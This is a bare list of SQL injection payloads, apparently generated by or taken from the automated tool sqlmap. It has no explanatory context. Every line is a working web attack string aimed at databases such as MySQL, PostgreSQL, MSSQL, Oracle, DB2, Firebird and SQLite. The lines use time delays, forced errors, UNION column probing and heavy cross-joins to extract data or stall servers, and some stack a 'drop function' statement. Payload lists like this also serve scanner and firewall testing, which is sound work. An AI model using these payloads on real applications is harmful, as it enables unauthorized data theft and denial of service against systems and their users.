+1' in boolean mode) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))#
+1")));call regexp_substring(repeat(right(char(3702),0),500000000),null) and ((("yzjl" like "yzjl
+-4205') or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))
+1" union all select null#
+1'));if(5896=4251) select 5896 else drop function xmyk--
+1") as nyzd where 5305=5305;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1)));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--
+1" union all select null,null,null,null,null,null,null#
+1");select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ("pxbk" like "pxbk
+1') as irsh where 4973=4973 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--
+1') union all select null,null,null,null,null,null--
+1" (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)
+-1641' union all select 4835#
+1'+(select iutk where 6158=6158;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)+'
+1")) as vbpl where 3885=3885 and 6969=(select 6969 from pg_sleep(5))--
+1'+(select 'bsva' where 4378=4378 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))+'
+1')) as zffq where 9572=9572 or 6793=(select 6793 from pg_sleep(5))--
+1'))) or 8156=(select count(*) from generate_series(1,5000000))--
+1 or sleep(5)# tdgb
+1%');select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ('%'='
+1'+(select pdfv where 1172=1172 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161))+'
+-3596') union all select 5349,5349,5349,5349,5349,5349#
+-6890"))) union all select 1115#
+-5355" or make_set(9354=9354,7185)
+1")));(select * from (select(sleep(5)))srmq) and ((("sxih"="sxih
+1 where 5691=5691 and (select * from (select(sleep(5)))fzno)--
+1 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))
+1") where 2496=2496;select * from generate_series(7667,7667,case when (7667=8232) then 1 else 0 end) limit 1--
+-5500') order by 1--
+-6067'+(select 'bfhf' where 3114=3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--
+1)) as sxhg where 7697=7697 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1%');select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#
+1" or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and "bkrk"="bkrk
+1") waitfor delay '0:0:5' and ("vjpg"="vjpg
+1)) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--
+1')) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (('mexd' like 'mexd
+1%'));select (case when (4006=1276) then 1 else 4006*(select 4006 from master..sysdatabases) end)--
+1')) as ngoo where 8641=8641 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--
+1,row(7937,5067)>(select count(*),concat(0x7171706a71,(select (elt(7937=7937,1))),0x717a767a71,floor(rand(0)*2))x from (select 9974 union select 5497 union select 8209 union select 8147)a group by x)
+-9795) as wrgs where 5427=5427 union all select 5427,5427,5427,5427,5427,5427--
+1' order by 1#
+-8359) where 4430=4430 or 6872=6872--
+1')));begin user_lock.sleep(5); end and ((('gqhc'='gqhc
+1%'))) and elt(7425=3843,3843) and ((('%'='
+-9191') as qtvm where 2838=2838 or (8459=8459)*4906--
+1' and 3824=benchmark(5000000,md5(0x76555642)) and 'hmqq'='hmqq
+1' in boolean mode);(select * from (select(sleep(5)))srmq)#
+-6341' or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and 'ugys'='ugys
+1%")) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (("%"="
+1'));select benchmark(5000000,md5(0x714e4153))#
+1%"))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((("%"="
+1" and sleep(5)#
+1%' rlike sleep(5) and '%'='
+1")) as nncz where 2331=2331;select case when 6420=7941 then 1 else null end--
+1'))) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--
+1%")) union all select null,null,null,null,null,null,null#
+1'+(select kgon where 9014=9014 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users))+'
+1) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--
+1") and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ("rvub" like "rvub
+1'||(select 'jslz' where 8405=8405 rlike (select * from (select(sleep(5)))sgvo))||'
+1")) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (("lazm" like "lazm
+1%')) or 4240=(select 4240 from pg_sleep(5))--
+1;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)# cdjm
+1%"))) and sleep(5) and ((("%"="
+1') and 7533=7533
+1 where 6965=6965 and elt(3933=1232,1232)--
+-7333%"))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((("%"="
+1")));select pg_sleep(5) and ((("wqeb"="wqeb
+1%'))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('%'='
+1"))) and elt(4249=4249,7259) and ((("awyk" like "awyk
+1;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual
+-3082") where 1082=1082 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--
+-8790') or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('nsze' like 'nsze
+1")));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((("ymss"="ymss
+-1588%"))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#
+1') or sleep(5) and ('mdmr' like 'mdmr
+1") as mszg where 6184=6184 rlike sleep(5)--
+1%')));waitfor delay '0:0:5'--
+1") as wvxt where 7321=7321 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--
+1'+(select plhk where 6540=6540;select (case when (8403=7151) then 8403 else cast(1 as int)/(select 0 from dual) end) from dual--
+1) and 6969=(select 6969 from pg_sleep(5))
+1") or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
+1")) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (("vdyr"="vdyr
+1") or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ("igop"="igop
+1%'))) and (select * from (select(sleep(5)))gcrr)#
+1) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (1624=1624
+-7543'))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#
+-1964') as ihsp where 6379=6379 or elt(6945=6165,6165)--
+1'||(select 'ypqa' where 1961=1961 or 6793=(select 6793 from pg_sleep(5)))||'
+-8023' in boolean mode) order by 1#
+1)) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((5281=5281
+1"))) and 4967=8866 and ((("jzyn" like "jzyn
+1"))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((("wvlb" like "wvlb
+1' or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and 'scye' like 'scye
+1)) as qlkf where 6635=6635;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--
+1' and 2908=8067--
+1'||(select 'yags' where 6268=6268 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))||'
+1') and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('lnte'='lnte
+-8640) or elt(7657=5020,5020) and (2346=2346
+1 where 7072=7072 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--
+-8094) or elt(1032=1032,3623) and (4569=4569
+1'||(select 'ukfj' where 7133=7133 union all select null,null,null#
+1") as nyui where 2511=2511;iif(5257=5257,1,1/0)
+1,(select (case when (8392=8404) then 1 else 8392*(select 8392 from information_schema.character_sets) end))
+-4798"))) union all select 7892,7892,7892,7892,7892,7892,7892,7892,7892,7892#
+1" where 8387=8387;select (case when (2751=8206) then 2751 else cast(1 as int)/(select 0 from dual) end) from dual--
+1') or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--
+-2116%'))) union all select 7119,7119,7119,7119,7119--
+1 where 4153=4153 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--
+1' or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--
+1') where 7391=7391 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--
+1"))) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((("hbgr" like "hbgr
+-9446)) as wmrq where 3705=3705 union all select 3705#
+1'))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('iari'='iari
+1%"));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (("%"="
+1') as ghks where 5128=5128 union all select null,null,null,null,null,null,null,null,null,null#
+1') where 8429=8429;select (case when (3855=3855) then 3855 else 1/(select 0) end)--
+1" or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and "vwep" like "vwep
+1;iif(2869=9448,1,1/0)
+1%")));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((("%"="
+1%";select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--
+1%') procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ('%'='
+1')));select (case when (6166=3364) then 6166 else cast(1 as int)/(select 0 from dual) end) from dual--
+-8042) as zhoq where 2120=2120 union all select 2120,2120,2120,2120,2120,2120,2120,2120,2120,2120--
+-5134))) or 8571=8571--
+1) as tykp where 6851=6851;waitfor delay '0:0:5'--
+1') or 6793=(select 6793 from pg_sleep(5)) and ('dtzt' like 'dtzt
+1"))) and elt(1750=7826,7826) and ((("qcro"="qcro
+-9541 where 4291=4291 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--
+1') and (select * from (select(sleep(5)))fzno) and ('mqoj' like 'mqoj
+1'||(select 'jscc' from dual where 3266=3266 and elt(4249=4249,7259))||'
+-3672")) union all select 6093#
+-2168) union all select 4980,4980,4980,4980,4980,4980,4980,4980,4980--
+-4960') union all select 5300--
+1"))) union all select null,null,null,null,null#
+(select count(*) from generate_series(1,5000000))
+1'+(select dagm where 5461=5461 or 8466=benchmark(5000000,md5(0x694a4745)))+'
+-2899")) as uyoc where 8417=8417 union all select 8417,8417,8417,8417--
+1%')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ('%'='
+1')) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('nlnk' like 'nlnk
+1"))) rlike (select * from (select(sleep(5)))sgvo) and ((("sdps"="sdps
+1'))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('vjhw' like 'vjhw
+1) as amgf where 4308=4308 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--
+1';select * from generate_series(4465,4465,case when (4465=6232) then 1 else 0 end) limit 1--
+1')) as fwxq where 9935=9935 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--
+1 where 6221=6221 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--
+1 where 3802=3802 and 2006=2006
+1")) union all select null,null,null,null#
+1'))) union all select null,null,null,null,null,null,null#
+-6335"))) union all select 3654--
+1') where 9221=9221 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--
+1") procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#
+1))) union all select null,null,null,null,null,null,null--
+1" and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and "tjbe" like "tjbe
+1" where 9342=9342 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--
+1')) as tlsl where 8467=8467;begin user_lock.sleep(5); end--
+1%"))) union all select null,null,null#
+1',(select (case when (2073=5314) then 1 else 1/(select 0) end))
+1";begin dbms_lock.sleep(5); end
+1);call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1'+(select 'idmr' where 5029=5029 union all select null,null,null,null,null,null--
+1")) as nbdc where 4444=4444 union all select null,null--
+1' or elt(6272=6272,sleep(5)) and 'fvtf' like 'fvtf
+-5962)) as jbqv where 2583=2583 or 7496=8560--
+1") where 3404=3404 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--
+1") and 8407=(select count(*) from generate_series(1,5000000)) and ("kssm"="kssm
+1%'))) union all select null,null,null#
+1) as ocut where 6800=6800 and elt(4249=4249,7259)--
+1%" and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--
+1',(case when 3598=2118 then 1 else null end)
+1") where 3826=3826;select count(*) from generate_series(1,5000000)--
+1 or (select * from (select(sleep(5)))sddo)#
+-1011 or 7140=9977--
+1'+(select 'kqnj' where 9483=9483 or elt(5873=5873,sleep(5))#
+1") or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--
+1')) as tgso where 1349=1349 union all select null,null,null,null--
+1) as azoo where 8933=8933 and (3020=3020)*6703--
+1%';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--
+1) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)
+1' and sleep(5)
+-7418 union all select 1340,1340,1340,1340,1340#
+1'||(select 'adni' from dual where 6611=6611;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual)||'
+-4644 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')# upwd
+-3862)) as vqtl where 9629=9629 union all select 9629,9629,9629,9629,9629--
+-3865") where 3559=3559 union all select 3559,3559,3559,3559,3559,3559,3559--
+1%");select (case when (3855=3855) then 3855 else 1/(select 0) end)--
+1) union all select null,null,null,null,null,null,null,null--
+1' where 8099=8099;waitfor delay '0:0:5'--
+-3068%")) union all select 6597,6597,6597,6597,6597,6597,6597,6597--
+-6214" union all select 3323,3323#
+1)) as jmcp where 8624=8624 union all select null,null,null,null,null,null,null,null,null,null--
+1')) as wjfj where 3802=3802;if(8574=7534) select 8574 else drop function nxbe--
+1'+(select 'nlvq' where 7528=7528 or (select * from (select(sleep(5)))sddo)#
+-5863" or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and "gkvy"="gkvy
+1') where 8204=8204;select count(*) from generate_series(1,5000000)--
+1")));select count(*) from generate_series(1,5000000) and ((("wdbg" like "wdbg
+1 where 3502=3502 order by 1--
+1" where 6800=6800 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#
+1) where 6340=6340 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--
+1 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))# dwxl
+-5478") where 4100=4100 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--
+1') as sjij where 8659=8659;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1'||(select 'fcws' from dual where 9184=9184 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161))||'
+1";(select * from (select(sleep(5)))acdk)#
+1') where 5799=5799 union all select null,null,null,null,null--
+1))) union all select null,null,null,null,null,null,null,null,null,null--
+1' where 5023=5023 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
+1')) as orvy where 7270=7270 union all select null,null,null,null,null,null,null,null#
+1") and 8407=(select count(*) from generate_series(1,5000000)) and ("wmmg" like "wmmg
+1') as ncou where 9166=9166 and (select * from (select(sleep(5)))fzno)--
+1')) union all select null,null,null,null,null,null,null#
+1) and sleep(5)#
+-8677'||(select 'ihpm' from dual where 9571=9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--
+1%");select (case when (5163=4861) then 1 else 5163*(select 5163 from master..sysdatabases) end)--
+-9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--
+1") where 5814=5814 and 6969=(select 6969 from pg_sleep(5))--
+1') and 2006=2006
+-9263') as qodg where 6798=6798 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--
+1') and 1987=3756#
+1')) as clhk where 4607=4607 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--
+-8129'))) union all select 4531,4531,4531#
+1'||(select 'wcad' from dual where 4262=4262 and elt(3114=3114,sleep(5))#
+1" where 4066=4066 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--
+make_set(7729=7729,1)
+1") as xaye where 5343=5343 and 4355=7475#
+1%")) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (("%"="
+1'||(select 'sned' where 4957=4957 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--
+1")) as itxo where 7916=7916;select count(*) from generate_series(1,5000000)--
+1'));call regexp_substring(repeat(right(char(2385),0),500000000),null)--
+1%')) and (select * from (select(sleep(5)))gcrr)#
+-8429'))) or make_set(9354=9354,7185) and ((('bwih' like 'bwih
+1%') and (3020=3020)*6703 and ('%'='
+1")) as jikg where 8258=8258 and (3973=1047)*1047--
+1 where 4003=4003 union all select null--
+-8118") where 3561=3561 or (8459=8459)*4906--
+1)) and 3228=7376#
+1')) as xebq where 7959=7959 union all select null,null,null,null,null,null#
+1");select count(*) from generate_series(1,5000000)--
+1%") or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--
+-8684 union all select 9519,9519,9519,9519--
+1') and make_set(8403=8403,8899)
+1') as nexa where 6740=6740;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--
+-7034'))) union all select 4023#
+-6496") as obnf where 2903=2903 or make_set(9354=9354,7185)--
+1") as fkgs where 5948=5948 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--
+1%') and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('%'='
+1) as jvmv where 3857=3857 and (5717=6483)*6483--
+1') and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('mseo' like 'mseo
+-6766'))) or 3038=3038
+-3431%') or 9323=9323#
+1');select (case when (9130=1826) then 9130 else 9130*(select 9130 from mysql.db) end)#
+-5438") union all select 3170,3170--
+1'||(select 'jzwq' where 3289=3289 union all select null,null,null,null,null,null,null#
+-4955%' union all select 5928,5928--
+1') where 1502=1502 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--
+1,iif(1440=4612,1,1/0)
+-5928")) or elt(1032=1032,3623) and (("rggt" like "rggt
+1%");select (case when (1898=4705) then 1898 else 1/(select 0) end)--
+1' in boolean mode);select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3#
+1'+(select gqez where 3704=3704;select (case when (9030=6952) then 1 else 9030*(select 9030 from master..sysdatabases) end)--
+1")) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (("qnqb" like "qnqb
+1%'))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((('%'='
+1)) and sleep(5) and ((9084=9084
+-7962')) as pgqz where 6058=6058 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--
+1")) as fapw where 4722=4722 union all select null,null,null,null,null,null,null,null,null,null#
+1";select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--
+1%') and 2388=benchmark(5000000,md5(0x6d457153))#
+1) where 9160=9160;select (case when (3855=3855) then 3855 else 1/(select 0) end)--
+1))) union all select null,null#
+-1630' union all select 1971,1971--
+1'+(select lptb where 3861=3861 or sleep(5))+'
+1%'))) or sleep(5) and ((('%'='
+1') or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--
+1" where 5372=5372 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
+1') or (select * from (select(sleep(5)))sddo)#
+1');begin dbms_lock.sleep(5); end and ('hmtt' like 'hmtt
+1 where 2988=2988 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--
+1'||(select 'lxyu' from dual where 5789=5789 union all select null#
+1")) union all select null,null,null--
+-5967 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)# lhoh
+1' in boolean mode)(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)#
+-7884" where 3297=3297 or 2492=6158
+-4746%"))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((("%"="
+1' in boolean mode) and 9198=9198--
+1")) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (("fuus" like "fuus
+1') and 2577=7094
+1'+(select 'uqaf' where 7414=7414;iif(5257=5257,1,1/0)
+1;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3# sfup
+1")) waitfor delay '0:0:5'--
+1') and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('xazf'='xazf
+-4148%"))) or (8459=8459)*4906 and ((("%"="
+1'||(select 'ersu' where 4123=4123 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--
+1)));if(7899=7899) select 7899 else drop function zbbp--
+1') where 6387=6387 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--
+1%')) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('%'='
+1%"))) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--
+-3971%'))) or elt(1032=1032,3623) and ((('%'='
+1))) rlike (select * from (select(sleep(5)))vwyq)#
+-6766" where 6591=6591 or make_set(9354=9354,7185)--
+1%' or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--
+1'||(select 'zvpl' where 5877=5877 union all select null,null#
+1)) as bsvo where 3605=3605;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--
+1") where 7165=7165 or 8466=benchmark(5000000,md5(0x694a4745))--
+1)) rlike sleep(5) and ((8773=8773
+1))) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--
+1") as piwi where 2918=2918;(select * from (select(sleep(5)))acdk)#
+1') where 4778=4778 and elt(3114=3114,sleep(5))#
+1)) as ipfy where 1189=1189;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--
+1") as yggn where 1006=1006 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--
+1))) order by 1--
+1')) and elt(4249=4249,7259) and (('xjns'='xjns
+1'))) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ((('cenk'='cenk
+1 waitfor delay '0:0:5'-- nnnp
+1' in boolean mode) union all select null,null,null,null,null,null,null,null--
+1)) as ogcv where 4396=4396;if(7899=7899) select 7899 else drop function zbbp--
+1%' and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--
+1);select benchmark(5000000,md5(0x4c4d6142)) and (8126=8126
+1'||(select 'ldad' where 6146=6146 rlike (select (case when (7689=7689) then 1 else 0x28 end)))||'
+1;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--
+1") and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ("ijop"="ijop
+1 where 2301=2301;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--
+1")) as lfte where 3811=3811 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--
+1" and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)
+1'||(select 'vdeo' where 4355=4355;(select * from (select(sleep(5)))acdk)#
+1 where 7224=7224 and sleep(5)#
+1%")));begin dbms_lock.sleep(5); end--
+1');begin user_lock.sleep(5); end and ('nchh'='nchh
